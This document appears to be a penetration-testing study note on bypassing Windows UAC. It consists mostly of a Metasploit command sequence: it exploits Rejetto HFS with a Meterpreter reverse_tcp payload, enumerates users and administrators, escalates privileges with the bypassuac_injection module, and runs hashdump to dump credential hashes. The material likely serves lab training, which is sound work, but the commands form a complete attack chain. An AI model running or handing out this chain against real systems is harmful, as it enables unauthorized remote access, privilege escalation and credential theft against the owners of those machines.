# Bypassing UAC

- UAC is used to ensure that changes to the operating system require approval from the administrator
- Still working on many Windows versions
- Powerful privilege escalation technique

## Demonstration

```bash
> db_nmap -sV <ip>
> use exploit/windows/http/rejetto_hfs_exec
> set payload windows/x64/meterpreter/reverse_tcp
> run
m> sysinfo
m> getuid
m> getsystem
m> getprivs
m> shell
>net users
>net localgroup administrators
>^C
m> background
> use exploit/windows/local/bypassuac_injection
> set payload windows/x64/meterpreter/reverse_tcp
> set SESSION
> set LPORT <port>
# if bad-config error
> set TARGET Windows\ x64
> run
m> getuid
m> getsystem
m> hashdump
```
